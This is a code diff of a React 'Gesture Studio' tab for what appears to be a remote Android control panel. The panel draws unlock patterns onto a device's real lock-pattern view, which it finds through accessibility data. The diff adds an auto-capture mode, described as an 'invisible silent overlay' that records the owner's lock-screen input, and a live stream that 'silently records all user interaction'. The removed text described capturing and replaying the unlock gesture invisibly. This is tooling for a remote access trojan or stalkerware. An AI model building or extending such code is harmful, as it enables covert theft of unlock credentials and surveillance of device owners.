@@ -2,14 +2,6 @@ import React, { useState, useEffect, useRef, useCallback } from 'react';
 
 const COLORS = ['#00ff88', '#00ccff', '#ff6b35', '#ffd700', '#cc77ff'];
 
-// ── Smart pattern helpers ────────────────────────────────────────────────────
-
-/**
- * Search the accessibility element list for the lock pattern view.
- * Priority 1: viewId contains "lockpatternview" or "lock_pattern"
- * Priority 2: className contains "LockPattern"
- * Priority 3: large square-ish clickable view with no text
- */
 function findPatternBox(elements, deviceW, deviceH) {
   for (const el of elements) {
     const vid = (el.viewId || '').toLowerCase();
@@ -54,11 +46,6 @@ function findPatternBox(elements, deviceW, deviceH) {
   return candidates[0].bounds;
 }
 
-/**
- * Remap PatternDrawer node nx/ny (relative to the pattern frame) to the
- * actual lockPatternView bounding box on the device screen.
- * The inner grid sits inside a ~17 % margin on all sides of the pattern box.
- */
 function remapNodesToBox(nodes, box, deviceW, deviceH) {
   const nxVals = nodes.map(n => n.nx);
   const nyVals = nodes.map(n => n.ny);
@@ -80,7 +67,6 @@ function remapNodesToBox(nodes, box, deviceW, deviceH) {
   }));
 }
 
-// ── 5 Pattern Size Presets ───────────────────────────────────────────────────
 const PATTERN_SIZES = [
   { id: 'large',    label: 'Large',    nodeR: 24, frameW: 280, frameH: 480, fontSize: 14, hintSize: 11 },
   { id: 'normal',   label: 'Normal',   nodeR: 18, frameW: 240, frameH: 420, fontSize: 12, hintSize: 10 },
@@ -89,7 +75,6 @@ const PATTERN_SIZES = [
   { id: 'mini',     label: 'Mini',     nodeR: 7,  frameW: 140, frameH: 250, fontSize: 7,  hintSize: 7 },
 ];
 
-// ── Gesture path preview (SVG) ──────────────────────────────────────────────
 function GesturePreview({ gesture, width = 200, height = 160 }) {
   if (!gesture || !gesture.points || gesture.points.length === 0) {
     return (
@@ -134,7 +119,6 @@ function GesturePreview({ gesture, width = 200, height = 160 }) {
   );
 }
 
-// ── Phone-frame Pattern Drawer (3×3 grid like a lock screen) ───────────────
 function PatternDrawer({ onSend, isOnline, sizePreset }) {
   const GRID = 3;
   const { nodeR: NODE_R, frameW: FRAME_W, frameH: FRAME_H, fontSize: FONT_SIZE, hintSize: HINT_SIZE } = sizePreset;
@@ -261,19 +245,16 @@ function PatternDrawer({ onSend, isOnline, sizePreset }) {
           onPointerUp={onPointerUp}
           onPointerLeave={onPointerUp}
         >
-          {/* Status bar */}
           <rect x={0} y={0} width={FRAME_W} height={STATUS_H} fill="#0d1929" />
           <text x={FRAME_W / 2} y={STATUS_H / 2 + 5} textAnchor="middle" fill="#475569" fontSize={HINT_SIZE - 1} fontFamily="monospace">
             12:00
           </text>
 
-          {/* Lock icon + hint */}
           <text x={FRAME_W / 2} y={Math.round(FRAME_H * 0.22)} textAnchor="middle" fill="#374151" fontSize={FONT_SIZE + 6} fontFamily="system-ui">🔒</text>
           <text x={FRAME_W / 2} y={Math.round(FRAME_H * 0.35)} textAnchor="middle" fill="#374151" fontSize={HINT_SIZE} fontFamily="system-ui">
             {sequence.length > 0 ? sequence.map(n => n + 1).join(' → ') : 'Draw pattern'}
           </text>
 
-          {/* Emergency call at bottom */}
           <rect x={0} y={FRAME_H - EMERG_H} width={FRAME_W} height={EMERG_H} fill="#0a111e" />
           <text x={FRAME_W / 2} y={FRAME_H - EMERG_H / 2 + 4} textAnchor="middle" fill="#ef4444" fontSize={HINT_SIZE - 1} fontFamily="system-ui" fontWeight="600">
             Emergency call
@@ -356,17 +337,111 @@ function PatternDrawer({ onSend, isOnline, sizePreset }) {
   );
 }
 
-// ── Gesture list item ────────────────────────────────────────────────────────
-const btnStyle = (bg) => ({
-  background: bg, border: 'none', borderRadius: 6, color: '#fff',
-  padding: '5px 12px', cursor: 'pointer', fontSize: 12, fontWeight: 600,
-  transition: 'opacity 0.15s',
+// ── Live Stream Canvas ────────────────────────────────────────────────────────
+function LiveStreamCanvas({ points, replayPoints, replayActive, width = 320, height = 200 }) {
+  const canvasRef = useRef(null);
+  const rafRef    = useRef(null);
+  const pad = 16;
+
+  const drawPoints = useCallback((ctx, pts, w, h, alpha = 1) => {
+    if (!pts || pts.length === 0) return;
+    const pointers = {};
+    pts.forEach(p => {
+      if (!pointers[p.id]) pointers[p.id] = [];
+      pointers[p.id].push(p);
+    });
+    Object.entries(pointers).forEach(([pid, pPts], idx) => {
+      const color = COLORS[idx % COLORS.length];
+      ctx.strokeStyle = color;
+      ctx.globalAlpha = alpha * 0.9;
+      ctx.lineWidth   = 3;
+      ctx.lineCap     = 'round';
+      ctx.lineJoin    = 'round';
+      ctx.beginPath();
+      let started = false;
+      pPts.forEach(p => {
+        const x = p.nx * (w - pad * 2) + pad;
+        const y = p.ny * (h - pad * 2) + pad;
+        if (!started) { ctx.moveTo(x, y); started = true; }
+        else           ctx.lineTo(x, y);
+      });
+      ctx.stroke();
+      if (pPts.length >= 1) {
+        ctx.globalAlpha = alpha;
+        ctx.fillStyle = color;
+        ctx.beginPath();
+        ctx.arc(pPts[0].nx * (w - pad * 2) + pad, pPts[0].ny * (h - pad * 2) + pad, 5, 0, Math.PI * 2);
+        ctx.fill();
+      }
+    });
+    ctx.globalAlpha = 1;
+  }, [pad]);
+
+  useEffect(() => {
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+    const ctx = canvas.getContext('2d');
+    ctx.clearRect(0, 0, width, height);
+    ctx.fillStyle = '#0b1220';
+    ctx.fillRect(0, 0, width, height);
+    drawPoints(ctx, points, width, height);
+  }, [points, width, height, drawPoints]);
+
+  useEffect(() => {
+    if (!replayActive || !replayPoints || replayPoints.length === 0) return;
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+    const ctx = canvas.getContext('2d');
+
+    const minT = replayPoints[0]?.t ?? 0;
+    const maxT = replayPoints[replayPoints.length - 1]?.t ?? 1;
+    const totalDur = maxT - minT || 1;
+    const REPLAY_DURATION = 2000; // animate over 2s
+    const startWall = performance.now();
+
+    const animate = (now) => {
+      const elapsed = now - startWall;
+      const progress = Math.min(elapsed / REPLAY_DURATION, 1);
+      const cutoffT   = minT + progress * totalDur;
+
+      const visible = replayPoints.filter(p => p.t <= cutoffT);
+
+      ctx.clearRect(0, 0, width, height);
+      ctx.fillStyle = '#0b1220';
+      ctx.fillRect(0, 0, width, height);
+      drawPoints(ctx, visible, width, height);
+
+      if (progress < 1) {
+        rafRef.current = requestAnimationFrame(animate);
+      }
+    };
+
+    rafRef.current = requestAnimationFrame(animate);
+    return () => { if (rafRef.current) cancelAnimationFrame(rafRef.current); };
+  }, [replayActive, replayPoints, width, height, drawPoints]);
+
+  return (
+    <canvas
+      ref={canvasRef}
+      width={width}
+      height={height}
+      style={{ borderRadius: 10, border: '1px solid #1e293b', display: 'block' }}
+    />
+  );
+}
+
+const btnStyle = (bg, disabled = false) => ({
+  background: disabled ? '#1e293b' : bg,
+  border: 'none', borderRadius: 6,
+  color: disabled ? '#475569' : '#fff',
+  padding: '5px 12px', cursor: disabled ? 'not-allowed' : 'pointer',
+  fontSize: 12, fontWeight: 600, transition: 'opacity 0.15s',
+  opacity: disabled ? 0.6 : 1,
 });
 
 const formatDur = ms => ms < 1000 ? `${ms}ms` : `${(ms / 1000).toFixed(1)}s`;
 const formatTime = ms => ms ? new Date(ms).toLocaleString() : '';
 
-// ── Main component ───────────────────────────────────────────────────────────
 export default function GestureTab({ device, sendCommand, results }) {
   const deviceId = device?.deviceId;
   const isOnline = device?.isOnline;
@@ -385,6 +460,24 @@ export default function GestureTab({ device, sendCommand, results }) {
   const pendingPatternRef               = useRef(null);
   const waitingForScreenRef             = useRef(false);
 
+  // ── Auto Capture (NO1/NO2) ─────────────────────────────────────────────────
+  const [autoCaptureActive, setAutoCaptureActive] = useState(false);
+  const [autoCaptureStatus, setAutoCaptureStatus] = useState('');
+  const autoCaptureRef = useRef(false);
+  const sendCmdRef     = useRef(null);
+
+  // ── Live Stream ────────────────────────────────────────────────────────────
+  const [liveActive, setLiveActive]           = useState(false);
+  const [livePoints, setLivePoints]           = useState([]);
+  const [liveStreamFile, setLiveStreamFile]   = useState(null);
+  const [liveStreams, setLiveStreams]          = useState([]);
+  const [lsLoading, setLsLoading]             = useState(false);
+  const [replayingLive, setReplayingLive]     = useState(null);
+  const [replayPoints, setReplayPoints]       = useState([]);
+  const [replayActive, setReplayActive]       = useState(false);
+  const livePollingRef = useRef(null);
+  const replayTimerRef = useRef(null);
+
   const deviceW = device?.deviceInfo?.screenWidth  || 720;
   const deviceH = device?.deviceInfo?.screenHeight || 1600;
 
@@ -396,11 +489,43 @@ export default function GestureTab({ device, sendCommand, results }) {
     if (deviceId) sendCommand(deviceId, cmd, params);
   }, [deviceId, sendCommand]);
 
+  // Keep ref updated for cleanup callbacks
+  useEffect(() => { sendCmdRef.current = sendCmd; }, [sendCmd]);
+  useEffect(() => { autoCaptureRef.current = autoCaptureActive; }, [autoCaptureActive]);
+
+  // ── Auto-stop capture when GestureTab unmounts (tab switch / back) ──────────
+  useEffect(() => {
+    return () => {
+      if (autoCaptureRef.current && sendCmdRef.current) {
+        sendCmdRef.current('gesture_auto_capture_stop', {});
+      }
+      if (livePollingRef.current) clearInterval(livePollingRef.current);
+    };
+  }, []);
+
   const loadList = useCallback(() => {
     setLoading(true);
     sendCmd('gesture_list');
   }, [sendCmd]);
 
+  const loadLiveStreams = useCallback(() => {
+    setLsLoading(true);
+    sendCmd('gesture_live_list');
+  }, [sendCmd]);
+
+  // ── Live stream polling ────────────────────────────────────────────────────
+  const startLivePolling = useCallback(() => {
+    if (livePollingRef.current) clearInterval(livePollingRef.current);
+    livePollingRef.current = setInterval(() => {
+      sendCmd('gesture_live_points');
+    }, 300);
+  }, [sendCmd]);
+
+  const stopLivePolling = useCallback(() => {
+    if (livePollingRef.current) { clearInterval(livePollingRef.current); livePollingRef.current = null; }
+  }, []);
+
+  // ── Result handler ─────────────────────────────────────────────────────────
   useEffect(() => {
     if (!results || results.length === 0) return;
     results.forEach(r => {
@@ -434,14 +559,93 @@ export default function GestureTab({ device, sendCommand, results }) {
       if (r.command === 'gesture_draw_pattern') {
         status(data.success ? 'Pattern sent to device' : 'Pattern failed: ' + (data.error || ''));
       }
+
+      // Auto Capture responses
       if (r.command === 'gesture_auto_capture_start') {
-        status(data.success
-          ? 'Auto-capture started — records when screen is locked'
-          : 'Failed: ' + (data.error || ''));
+        if (data.success) {
+          setAutoCaptureActive(true);
+          const msg = data.locked_first
+            ? 'Device was unlocked — locking screen, waking and pressing recents. Capture will begin.'
+            : (data.message || 'Auto-capture started');
+          setAutoCaptureStatus(msg);
+          status(msg);
+        } else {
+          setAutoCaptureActive(false);
+          setAutoCaptureStatus('Failed: ' + (data.error || ''));
+          status('Auto-capture failed: ' + (data.error || ''));
+        }
       }
       if (r.command === 'gesture_auto_capture_stop') {
-        status(data.success ? 'Auto-capture stopped' : 'Failed: ' + (data.error || ''));
-        if (data.success) loadList();
+        setAutoCaptureActive(false);
+        const msg = data.saved
+          ? `Capture stopped — gesture saved (${data.result?.pointCount ?? 0} points)`
+          : (data.message || 'Auto-capture stopped');
+        setAutoCaptureStatus(msg);
+        status(msg);
+        if (data.saved) loadList();
+      }
+
+      // Live Stream responses
+      if (r.command === 'gesture_live_start') {
+        if (data.success) {
+          setLiveActive(true);
+          setLivePoints([]);
+          setLiveStreamFile(null);
+          status('Live stream started — recording device interaction…');
+          startLivePolling();
+        } else {
+          status('Live stream failed: ' + (data.error || ''));
+        }
+      }
+      if (r.command === 'gesture_live_stop') {
+        setLiveActive(false);
+        stopLivePolling();
+        if (data.success && data.filename) {
+          setLiveStreamFile(data.filename);
+          status(`Live stream saved: ${data.filename}`);
+          loadLiveStreams();
+        } else {
+          status(data.message || 'Live stream stopped');
+        }
+      }
+      if (r.command === 'gesture_live_points') {
+        if (data.success && data.points) {
+          const pts = typeof data.points === 'string' ? JSON.parse(data.points) : data.points;
+          const mapped = [];
+          for (let i = 0; i < pts.length; i++) {
+            const p = pts[i];
+            mapped.push({ id: p.id ?? 0, nx: p.nx, ny: p.ny, t: p.t ?? i });
+          }
+          setLivePoints(mapped);
+        }
+      }
+      if (r.command === 'gesture_live_list') {
+        setLsLoading(false);
+        if (data.success && data.gestures) {
+          setLiveStreams(data.gestures.filter(g => g.label && g.label.startsWith('live_')));
+        }
+      }
+      if (r.command === 'gesture_live_delete') {
+        if (data.success) {
+          setLiveStreams(prev => prev.filter(g => g.filename !== data.filename));
+          if (liveStreamFile === data.filename) setLiveStreamFile(null);
+          status('Live stream deleted');
+        }
+      }
+      if (r.command === 'gesture_live_replay') {
+        setReplayingLive(null);
+        if (data.success && data.points) {
+          const pts = typeof data.points === 'string' ? JSON.parse(data.points) : data.points;
+          const mapped = pts.map((p, i) => ({ id: p.id ?? 0, nx: p.nx, ny: p.ny, t: p.t ?? i }));
+          setReplayPoints(mapped);
+          setReplayActive(false);
+          // brief delay then animate
+          setTimeout(() => setReplayActive(true), 50);
+          setTimeout(() => setReplayActive(false), 2500);
+          status(`Replaying ${data.filename} — drawing ${mapped.length} points`);
+        } else {
+          status('Replay failed: ' + (data.error || ''));
+        }
       }
 
       if (r.command === 'read_screen' && waitingForScreenRef.current && pendingPatternRef.current) {
@@ -455,9 +659,7 @@ export default function GestureTab({ device, sendCommand, results }) {
           setDetectedBox(box);
           const mapped = remapNodesToBox(nodes, box, deviceW, deviceH);
           sendCmd('gesture_draw_pattern', { nodes: mapped, sequence });
-          status(
-            `Smart pattern sent — pattern box at ${box.left},${box.top} (${box.right - box.left}×${box.bottom - box.top}px) · nodes: [${sequence.map(n => n + 1).join('→')}]`
-          );
+          status(`Smart pattern sent — pattern box at ${box.left},${box.top} (${box.right - box.left}×${box.bottom - box.top}px) · nodes: [${sequence.map(n => n + 1).join('→')}]`);
         } else {
           setDetectedBox(null);
           sendCmd('gesture_draw_pattern', { nodes, sequence });
@@ -465,7 +667,7 @@ export default function GestureTab({ device, sendCommand, results }) {
         }
       }
     });
-  }, [results, deviceW, deviceH]);
+  }, [results, deviceW, deviceH, loadList, loadLiveStreams, startLivePolling, stopLivePolling]);
 
   function handleSendPattern(nodes, sequence) {
     if (smartMode && isOnline) {
@@ -502,6 +704,45 @@ export default function GestureTab({ device, sendCommand, results }) {
     loadList();
   }
 
+  // Auto capture controls
+  function startAutoCapture() {
+    sendCmd('gesture_auto_capture_start');
+    setAutoCaptureStatus('Sending start command…');
+    status('Starting auto-capture…');
+  }
+
+  function stopAutoCapture() {
+    sendCmd('gesture_auto_capture_stop');
+    setAutoCaptureStatus('Stopping…');
+    status('Stopping auto-capture…');
+  }
+
+  // Live stream controls
+  function startLiveStream() {
+    setLivePoints([]);
+    setReplayActive(false);
+    sendCmd('gesture_live_start');
+    status('Starting live stream…');
+  }
+
+  function stopLiveStream() {
+    sendCmd('gesture_live_stop');
+    stopLivePolling();
+    status('Stopping live stream…');
+  }
+
+  function deleteLiveStream(filename) {
+    if (window.confirm(`Delete live stream "${filename}"?`)) {
+      sendCmd('gesture_live_delete', { filename });
+    }
+  }
+
+  function replayLiveStream(filename) {
+    setReplayingLive(filename);
+    sendCmd('gesture_live_replay', { filename });
+    status(`Loading replay for ${filename}…`);
+  }
+
   return (
     <div style={{ display: 'flex', flexDirection: 'column', height: '100%', fontFamily: 'system-ui,sans-serif', color: '#e2e8f0', background: '#0f172a' }}>
 
@@ -509,10 +750,10 @@ export default function GestureTab({ device, sendCommand, results }) {
         <span style={{ fontSize: 22 }}>✋</span>
         <div>
           <div style={{ fontWeight: 700, fontSize: 16 }}>Gesture Studio</div>
-          <div style={{ fontSize: 12, color: '#64748b' }}>Draw patterns and replay stored gestures on the device</div>
+          <div style={{ fontSize: 12, color: '#64748b' }}>Draw patterns, auto-capture, and live stream device interaction</div>
         </div>
         <div style={{ marginLeft: 'auto', display: 'flex', gap: 8 }}>
-          <button onClick={openGestures} disabled={!isOnline} style={btnStyle('#1d4ed8')}>
+          <button onClick={openGestures} disabled={!isOnline} style={btnStyle('#1d4ed8', !isOnline)}>
             View Saved Gestures ({gestures.length > 0 ? gestures.length : '…'})
           </button>
         </div>
@@ -526,6 +767,7 @@ export default function GestureTab({ device, sendCommand, results }) {
 
       <div style={{ flex: 1, display: 'flex', overflow: 'hidden' }}>
 
+        {/* Left column: pattern drawer */}
         <div style={{ width: 340, borderRight: '1px solid #1e293b', display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '16px 12px', gap: 12, overflowY: 'auto' }}>
 
           <div style={{ width: '100%', background: '#1e293b', borderRadius: 10, padding: '10px 12px', border: '1px solid #334155' }}>
@@ -584,8 +826,10 @@ export default function GestureTab({ device, sendCommand, results }) {
           <PatternDrawer onSend={handleSendPattern} isOnline={!!isOnline} sizePreset={sizePreset} />
         </div>
 
+        {/* Right column: Auto Capture + Live Stream */}
         <div style={{ flex: 1, display: 'flex', flexDirection: 'column', padding: 24, gap: 20, overflowY: 'auto' }}>
 
+          {/* ── How to use ─────────────────────────────────────────── */}
           <div style={{ background: '#1e293b', borderRadius: 12, padding: 20, border: '1px solid #334155' }}>
             <div style={{ fontWeight: 700, fontSize: 14, color: '#94a3b8', marginBottom: 12, textTransform: 'uppercase', letterSpacing: 0.5 }}>
               How to use Pattern Draw
@@ -593,94 +837,159 @@ export default function GestureTab({ device, sendCommand, results }) {
             <ol style={{ margin: 0, paddingLeft: 18, lineHeight: 2, fontSize: 13, color: '#94a3b8' }}>
               <li>Use the <strong style={{ color: '#6366f1' }}>Pattern Size</strong> toggles to match your target device screen size</li>
               <li>Click and drag through the dots on the phone frame to draw a pattern</li>
-              <li>The pattern will follow the selected nodes in order</li>
-              <li>With <strong style={{ color: '#6366f1' }}>Smart Mode ON</strong> (default), the dashboard reads the device screen first, locates the real lock pattern box, and maps your drawn pattern to its exact position</li>
+              <li>With <strong style={{ color: '#6366f1' }}>Smart Mode ON</strong>, the dashboard reads the device screen first, locates the real lock pattern box, and maps your drawn pattern to its exact position</li>
               <li>With Smart Mode OFF, the pattern is scaled to the full device screen</li>
-              <li>The detected box coordinates appear below the Smart Mode toggle after each send</li>
             </ol>
           </div>
 
-          <div style={{ background: '#1e293b', borderRadius: 12, padding: 20, border: '1px solid #334155' }}>
-            <div style={{ fontWeight: 700, fontSize: 14, color: '#94a3b8', marginBottom: 12, textTransform: 'uppercase', letterSpacing: 0.5 }}>
-              Auto-Capture Gestures
+          {/* ── Auto Capture (NO1 / NO2) ────────────────────────────── */}
+          <div style={{ background: '#1e293b', borderRadius: 12, padding: 20, border: `1px solid ${autoCaptureActive ? '#16a34a55' : '#334155'}` }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
+              <div style={{ fontWeight: 700, fontSize: 14, color: autoCaptureActive ? '#4ade80' : '#94a3b8', textTransform: 'uppercase', letterSpacing: 0.5 }}>
+                Auto Capture
+              </div>
+              {autoCaptureActive && (
+                <div style={{ display: 'flex', alignItems: 'center', gap: 4, fontSize: 11, color: '#4ade80', background: '#052e16', padding: '2px 8px', borderRadius: 99, fontWeight: 600 }}>
+                  <span style={{ animation: 'pulse 1s infinite', display: 'inline-block', width: 7, height: 7, borderRadius: '50%', background: '#4ade80' }}></span>
+                  CAPTURING
+                </div>
+              )}
+              <div style={{ fontSize: 11, color: '#6d28d9', background: '#2e1065', padding: '2px 8px', borderRadius: 99, fontWeight: 600, marginLeft: 'auto' }}>
+                LOCK SCREEN ONLY
+              </div>
             </div>
             <div style={{ fontSize: 13, color: '#64748b', marginBottom: 10, lineHeight: 1.7 }}>
-              Start capture, perform your gesture on the device, then press <strong style={{ color: '#e2e8f0' }}>Stop & Save</strong>.
-              The system will <strong style={{ color: '#e2e8f0' }}>immediately replay</strong> the gesture and only keep it if the device unlocks.
+              Creates an <strong style={{ color: '#e2e8f0' }}>invisible silent overlay</strong> on the device that records user input without any visual feedback.
+              Only runs when the device is <strong style={{ color: '#e2e8f0' }}>locked</strong>.
+              Auto-stops after <strong style={{ color: '#e2e8f0' }}>2 minutes</strong> of no input.
+              Stops automatically when you switch tabs here.
             </div>
             <div style={{ fontSize: 12, color: '#475569', marginBottom: 14, padding: '8px 12px', background: '#0f172a', borderRadius: 8, border: '1px solid #1e293b' }}>
-              1. Press <strong style={{ color: '#94a3b8' }}>Start Auto-Capture</strong><br />
-              2. Perform your unlock gesture on the device<br />
-              3. Press <strong style={{ color: '#94a3b8' }}>Stop & Save</strong><br />
-              4. System replays gesture automatically<br />
-              ✅ Device unlocks → gesture is saved permanently<br />
-              ❌ Still locked → gesture is discarded automatically
+              If device is <strong style={{ color: '#94a3b8' }}>unlocked</strong> when you press Start — it will automatically:<br />
+              <strong style={{ color: '#a78bfa' }}>① Lock screen → ② Wake screen → ③ Press Recents</strong><br />
+              Then capture begins when the lock screen appears.
             </div>
+            {autoCaptureStatus && (
+              <div style={{ fontSize: 12, color: autoCaptureActive ? '#4ade80' : '#94a3b8', padding: '6px 10px', background: '#0f172a', borderRadius: 6, marginBottom: 12, border: '1px solid #1e293b' }}>
+                {autoCaptureStatus}
+              </div>
+            )}
             <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
               <button
-                onClick={() => { sendCmd('gesture_auto_capture_start'); status('Starting auto-capture…'); }}
-                disabled={!isOnline}
-                style={{ ...btnStyle('#16a34a'), padding: '8px 18px' }}
+                onClick={startAutoCapture}
+                disabled={!isOnline || autoCaptureActive}
+                style={{ ...btnStyle('#16a34a', !isOnline || autoCaptureActive), padding: '8px 18px' }}
               >
                 ⏺ Start Auto-Capture
               </button>
               <button
-                onClick={() => { sendCmd('gesture_auto_capture_stop'); status('Stopping auto-capture…'); }}
-                disabled={!isOnline}
-                style={{ ...btnStyle('#dc2626'), padding: '8px 18px' }}
+                onClick={stopAutoCapture}
+                disabled={!isOnline || !autoCaptureActive}
+                style={{ ...btnStyle('#dc2626', !isOnline || !autoCaptureActive), padding: '8px 18px' }}
               >
                 ⏹ Stop & Save
-              </button>
-              <button
-                onClick={openGestures}
-                disabled={!isOnline}
-                style={{ ...btnStyle('#334155'), padding: '8px 18px' }}
-              >
-                View Saved Gestures
               </button>
             </div>
           </div>
 
-          {/* ── Live Mirror Mode ─────────────────────────────────────────── */}
-          <div style={{ background: '#1e293b', borderRadius: 12, padding: 20, border: '1px solid #7c3aed' }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
-              <div style={{ fontWeight: 700, fontSize: 14, color: '#a78bfa', textTransform: 'uppercase', letterSpacing: 0.5 }}>
-                Live Mirror Mode
+          {/* ── Live Stream ─────────────────────────────────────────── */}
+          <div style={{ background: '#1e293b', borderRadius: 12, padding: 20, border: `1px solid ${liveActive ? '#0369a155' : '#334155'}` }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
+              <div style={{ fontWeight: 700, fontSize: 14, color: liveActive ? '#38bdf8' : '#94a3b8', textTransform: 'uppercase', letterSpacing: 0.5 }}>
+                Live Stream
               </div>
-              <div style={{ fontSize: 11, color: '#6d28d9', background: '#2e1065', padding: '2px 8px', borderRadius: 99, fontWeight: 600 }}>
-                LOCKED SCREEN ONLY
-              </div>
+              {liveActive && (
+                <div style={{ display: 'flex', alignItems: 'center', gap: 4, fontSize: 11, color: '#38bdf8', background: '#082f49', padding: '2px 8px', borderRadius: 99, fontWeight: 600 }}>
+                  <span style={{ animation: 'pulse 0.8s infinite', display: 'inline-block', width: 7, height: 7, borderRadius: '50%', background: '#38bdf8' }}></span>
+                  STREAMING
+                </div>
+              )}
             </div>
-            <div style={{ fontSize: 13, color: '#64748b', marginBottom: 10, lineHeight: 1.7 }}>
-              Fully autonomous — requires <strong style={{ color: '#e2e8f0' }}>no dashboard interaction</strong> once started.
-              An invisible overlay sits on the lock screen and intercepts every gesture the user draws.
-              Each gesture is immediately replayed at <strong style={{ color: '#e2e8f0' }}>10–20ms</strong> (imperceptibly fast).
-              Only runs while the device is locked; stops automatically when unlocked.
+            <div style={{ fontSize: 13, color: '#64748b', marginBottom: 12, lineHeight: 1.7 }}>
+              Silently records all user interaction on the device in real-time.
+              View the live interaction below as it happens.
+              Replay draws the recorded path directly on the canvas — no overlay on device.
             </div>
-            <div style={{ fontSize: 12, color: '#475569', marginBottom: 14, padding: '8px 12px', background: '#0f172a', borderRadius: 8, border: '1px solid #2e1065' }}>
-              1. Lock the device<br />
-              2. Press <strong style={{ color: '#a78bfa' }}>Enable Mirror Mode</strong> from here<br />
-              3. Any gesture drawn on the lock screen is silently captured<br />
-              4. Gesture replays at 10–20ms automatically (invisible to user)<br />
-              ✅ Device unlocks → correct gesture saved, mode stops<br />
-              ❌ Still locked → buffer clears, listens for next gesture
-            </div>
-            <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
+
+            <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', marginBottom: 16 }}>
               <button
-                onClick={() => { sendCmd('gesture_mirror_start'); status('Mirror mode enabling — device must be locked…'); }}
-                disabled={!isOnline}
-                style={{ ...btnStyle('#7c3aed'), padding: '8px 18px' }}
+                onClick={startLiveStream}
+                disabled={!isOnline || liveActive}
+                style={{ ...btnStyle('#0369a1', !isOnline || liveActive), padding: '8px 18px' }}
               >
-                Enable Mirror Mode
+                ▶ Start Stream
               </button>
               <button
-                onClick={() => { sendCmd('gesture_mirror_stop'); status('Mirror mode stopped.'); }}
-                disabled={!isOnline}
-                style={{ ...btnStyle('#334155'), padding: '8px 18px' }}
+                onClick={stopLiveStream}
+                disabled={!isOnline || !liveActive}
+                style={{ ...btnStyle('#7c3aed', !isOnline || !liveActive), padding: '8px 18px' }}
               >
-                Disable Mirror Mode
+                ⏹ Stop & Save
+              </button>
+              <button
+                onClick={loadLiveStreams}
+                disabled={lsLoading}
+                style={{ ...btnStyle('#334155', lsLoading), padding: '8px 14px' }}
+              >
+                {lsLoading ? '…' : '↻ Refresh'}
               </button>
             </div>
+
+            {/* Live canvas */}
+            <div style={{ marginBottom: 16 }}>
+              <div style={{ fontSize: 11, color: '#475569', marginBottom: 6, textTransform: 'uppercase', letterSpacing: 0.5 }}>
+                {replayActive ? 'Replaying…' : liveActive ? 'Live interaction' : 'Canvas'}
+              </div>
+              <LiveStreamCanvas
+                points={liveActive ? livePoints : []}
+                replayPoints={replayPoints}
+                replayActive={replayActive}
+                width={460}
+                height={200}
+              />
+            </div>
+
+            {/* Saved live streams list */}
+            {liveStreams.length > 0 && (
+              <div>
+                <div style={{ fontSize: 11, color: '#475569', marginBottom: 8, textTransform: 'uppercase', letterSpacing: 0.5 }}>
+                  Saved Streams ({liveStreams.length})
+                </div>
+                <div style={{ display: 'flex', flexDirection: 'column', gap: 6, maxHeight: 180, overflowY: 'auto' }}>
+                  {liveStreams.map(g => (
+                    <div key={g.filename} style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '8px 10px', background: '#0f172a', borderRadius: 8, border: '1px solid #1e293b' }}>
+                      <div style={{ flex: 1, minWidth: 0 }}>
+                        <div style={{ fontSize: 12, color: '#e2e8f0', fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{g.filename}</div>
+                        <div style={{ fontSize: 11, color: '#475569' }}>
+                          {g.pointCount != null && `${g.pointCount} pts`}
+                          {g.durationMs != null && ` · ${formatDur(g.durationMs)}`}
+                        </div>
+                      </div>
+                      <button
+                        onClick={() => replayLiveStream(g.filename)}
+                        disabled={!isOnline || replayingLive === g.filename}
+                        style={{ ...btnStyle('#1d4ed8', !isOnline || replayingLive === g.filename), padding: '4px 10px', fontSize: 11 }}
+                        title="Replay on canvas"
+                      >
+                        {replayingLive === g.filename ? '…' : '▶ Replay'}
+                      </button>
+                      <button
+                        onClick={() => deleteLiveStream(g.filename)}
+                        style={{ ...btnStyle('#7f1d1d'), padding: '4px 8px', fontSize: 11 }}
+                        title="Delete stream"
+                      >
+                        🗑
+                      </button>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            )}
+            {liveStreams.length === 0 && !lsLoading && (
+              <div style={{ fontSize: 12, color: '#334155', textAlign: 'center', padding: '12px 0' }}>
+                No saved streams yet — start a stream and stop it to save
+              </div>
+            )}
           </div>
 
         </div>
@@ -688,6 +997,7 @@ export default function GestureTab({ device, sendCommand, results }) {
 
       <style>{`@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }`}</style>
 
+      {/* ── Saved Gestures Modal ──────────────────────────────────────────────── */}
       {showGestures && (
         <div
           style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999 }}
@@ -698,7 +1008,7 @@ export default function GestureTab({ device, sendCommand, results }) {
             <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '12px 16px', borderBottom: '1px solid #334155', background: '#162032' }}>
               <span style={{ fontWeight: 700, color: '#94a3b8', fontSize: 13, textTransform: 'uppercase', letterSpacing: 1 }}>Saved Gestures</span>
               <span style={{ fontSize: 11, color: '#64748b' }}>{gestures.length} records</span>
-              <button onClick={loadList} disabled={loading} style={{ ...btnStyle('#334155'), fontSize: 11, padding: '3px 10px', marginLeft: 4 }}>
+              <button onClick={loadList} disabled={loading} style={{ ...btnStyle('#334155', loading), fontSize: 11, padding: '3px 10px', marginLeft: 4 }}>
                 {loading ? '…' : '↻ Refresh'}
               </button>
               <button onClick={() => setShowGestures(false)} style={{ marginLeft: 'auto', ...btnStyle('#334155') }}>✕ Close</button>
@@ -733,7 +1043,7 @@ export default function GestureTab({ device, sendCommand, results }) {
                       <div style={{ display: 'flex', gap: 4 }}>
                         <button onClick={e => { e.stopPropagation(); replay(g.filename); }}
                           disabled={!isOnline || replayingFile === g.filename}
